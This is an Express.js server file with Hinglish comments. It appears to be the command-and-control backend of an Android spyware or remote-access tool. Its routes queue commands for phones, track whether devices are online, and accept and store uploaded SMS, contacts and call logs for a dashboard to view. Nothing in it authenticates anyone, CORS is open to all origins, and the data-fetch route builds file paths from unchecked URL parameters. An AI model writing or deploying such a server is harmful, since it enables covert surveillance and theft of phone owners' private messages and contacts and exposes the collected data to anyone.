const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// 1. CORS Fix: Isse dashboard kahi se bhi connect ho jayega
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST']
}));

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));

// 2. Static Files: Isse index.html aur baki pages server se load honge
app.use(express.static(__dirname));

const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);

let deviceState = {}; 

// 3. API: Dashboard ke liye status check
app.get('/api/device-status/:deviceId', (req, res) => {
    const state = deviceState[req.params.deviceId] || { isOnline: false };
    // Agar phone ne pichle 20 sec me signal bheja hai toh Online
    const isOnline = state.lastSeen ? (Date.now() - state.lastSeen) < 20000 : false;
    res.json({ ...state, isOnline });
});

// 4. API: Dashboard se command bhejna
app.post('/api/send-command', (req, res) => {
    const { device_id, command } = req.body;
    if (!deviceState[device_id]) deviceState[device_id] = {};
    deviceState[device_id].currentCommand = command;
    console.log(`🚀 New Command for ${device_id}: ${command}`);
    res.json({ status: "success" });
});

// 5. API: Phone se status update aana (V.V. Important)
app.post('/api/update-status', (req, res) => {
    const { device_id, model, android_version, battery, ringerMode } = req.body;
    
    deviceState[device_id] = {
        model: model || "Android Device",
        android_version: android_version || "--",
        battery: battery || 0,
        ringerMode: ringerMode || "normal",
        lastSeen: Date.now(),
        currentCommand: deviceState[device_id]?.currentCommand || "none"
    };
    
    // Command return karna taaki phone action le sake
    const cmd = deviceState[device_id].currentCommand;
    deviceState[device_id].currentCommand = "none"; 
    res.json({ command: cmd });
});

// 6. API: SMS, Contacts, Calls upload karna
app.post('/api/upload-data', (req, res) => {
    const { device_id, type, data } = req.body; 
    const fileName = `${device_id}_${type}.json`;
    const filePath = path.join(DATA_DIR, fileName);
    
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
    console.log(`📂 Data Received: ${type} from ${device_id}`);
    res.send("Saved Locally on Server");
});

// 7. API: Dashboard par SMS/Calls dikhane ke liye data fetch karna
app.get('/api/get-data/:deviceId/:type', (req, res) => {
    const filePath = path.join(DATA_DIR, `${req.params.deviceId}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]);
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server is running on port ${PORT}`);
});
